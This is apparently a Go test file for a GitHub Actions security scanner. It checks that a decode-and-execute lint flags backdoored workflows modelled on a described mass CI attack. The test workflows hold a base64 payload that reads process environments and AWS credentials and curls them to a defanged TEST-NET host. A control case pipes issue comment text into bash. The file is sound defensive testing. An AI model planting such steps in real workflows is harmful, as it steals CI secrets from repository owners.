package cli

// Attack 2026-33: Megalodon mass CI backdoor (2026-05-18). 5,718 commits
// pushed with one token to 5,561 repos added a workflow whose run: step was
// `echo <base64> | base64 -d | bash`, harvesting runner credentials,
// /proc/*/environ and cloud metadata to 216.126.225.129:8443. Two variants:
// SysDiag (push + pull_request_target) and Optimize-Build (workflow_dispatch,
// a dormant backdoor).
//
// Covered since v0.22.106 (F16): LintWorkflow's action.decode_exec flags a
// run: step that decodes a payload and executes it, so scan-actions reports
// it high (default exit 1) and pr-scan's diffWorkflow gives the workflow a
// warn row. The commits were direct pushes, so a PR gate would not have run;
// scan-actions as a required check on the default branch, or an
// evaluate-actions sweep, is what sees them. Negative twin: a step that
// decodes a secret to a file. The payload IP below is TEST-NET
// (192.0.2.10), defanged.

import "testing"

const atk33Payload = "Y2F0IC9wcm9jLyovZW52aXJvbiB+Ly5hd3MvY3JlZGVudGlhbHMgMj4vZGV2L251bGwgfCBjdXJsIC1zIC0tZGF0YS1iaW5hcnkgQC0gaHR0cDovLzE5Mi4wLjIuMTA6ODQ0My9j"

func TestAttack2026_33_MegalodonWorkflowBackdoor(t *testing.T) {
	variants := map[string]string{
		"sysdiag.yml": `name: SysDiag
on:
  push:
  pull_request_target:
jobs:
  diag:
    runs-on: ubuntu-latest
    steps:
      - name: Collect diagnostics
        run: echo "` + atk33Payload + `" | base64 -d | bash
`,
		"optimize-build.yml": `name: Optimize-Build
on:
  workflow_dispatch:
jobs:
  optimize:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
    steps:
      - name: ci build optimization step
        run: echo "` + atk33Payload + `" | base64 -d | bash
`,
	}
	for name, body := range variants {
		code, r, err := runScanActionsJSON(t, atk26WriteWF(t, name, body), "low")
		if err != nil {
			t.Fatal(err)
		}
		if code != 1 || atk26Sigs(r)["action.decode_exec"] != "high" {
			t.Fatalf("%s: want high action.decode_exec and exit 1, got exit %d %+v", name, code, r.Findings)
		}
		if !atk26PRScanLints(t, name, body, "action.decode_exec") {
			t.Fatalf("%s: pr-scan: want a warn row with action.decode_exec", name)
		}
	}

	// Negative twin: decoding a secret to a file executes nothing.
	const benign = `on: [push]
jobs:
  sign:
    runs-on: ubuntu-latest
    steps:
      - run: echo "$KEYSTORE_B64" | base64 -d > release.jks
`
	if code, r, err := runScanActionsJSON(t, atk26WriteWF(t, "sign.yml", benign), "low"); err != nil || code != 0 || len(r.Findings) != 0 {
		t.Fatalf("decode to a file: want no findings, exit 0; got exit %d %+v (%v)", code, r.Findings, err)
	}

	// Harness control: the same scan does report a structural lint finding,
	// so the zero above is the lint's coverage, not a broken harness.
	ctl := atk26WriteWF(t, "ctl.yml", `on: [issue_comment]
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ github.event.comment.body }}" | base64 -d | bash
`)
	if code, r, _ := runScanActionsJSON(t, ctl, ""); code != 1 || atk26Sigs(r)["action.script_injection"] != "high" {
		t.Fatalf("control: want script_injection, exit 1; got %d %+v", code, r.Findings)
	}
}
